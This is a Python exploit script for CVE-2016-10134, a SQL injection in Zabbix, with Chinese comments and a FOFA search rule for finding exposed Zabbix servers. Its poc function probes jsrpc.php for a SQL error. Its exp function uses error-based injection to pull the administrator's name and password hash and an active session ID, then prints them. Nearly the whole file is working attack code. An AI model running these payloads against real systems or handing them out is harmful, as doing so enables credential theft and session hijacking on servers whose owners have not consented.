#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import re
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# 脚本信息
######################################################
NAME='CVE_2016_10134'
AUTHOR="Joker"
REMARK='Zabbix SQL注入'
FOFA_RULE='title="zabbix"'
######################################################

def poc(target):
    result = {}
    #'检查是否存在 SQL 注入'
    payload = "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=999'&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1"
    vuln_url1 = target + payload
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        r1 = requests.get(url=vuln_url1, headers=headers, verify=False, timeout=5)
        if 'You have an error in your SQL syntax' in r1.text:
            result['target'] = target
            result['poc'] = NAME
            return result
        else:
            pass
    except Exception as e:
        pass

def exp(target):
    # '尝试进行用户密码注入'
    result ={}
    passwd = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
    session = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
    payload2 = target + "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=" + passwd + "&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1"
    payload3 = target + "/jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=" + session + "&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1"
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        r2 = requests.get(url=payload2, headers=headers, verify=False, timeout=5)
        r3 = requests.get(url=payload3, headers=headers, verify=False, timeout=5)
        result_reg = re.compile(r"Duplicate\s*entry\s*'~(.+?)~1")
        result2 = result_reg.findall(r2.text)
        result3 = result_reg.findall(r3.text)
        if result2:
           print("[+]" + target )
           print("管理员 用户密码:" + result2[0])
        if result3:
           print("Cookie SessionID:" + result3[0])
        else:
           print("未成功利用")

    except Exception as e:
        # print(e)
        pass


if __name__ == '__main__':
    poc("http://127.0.0.1")
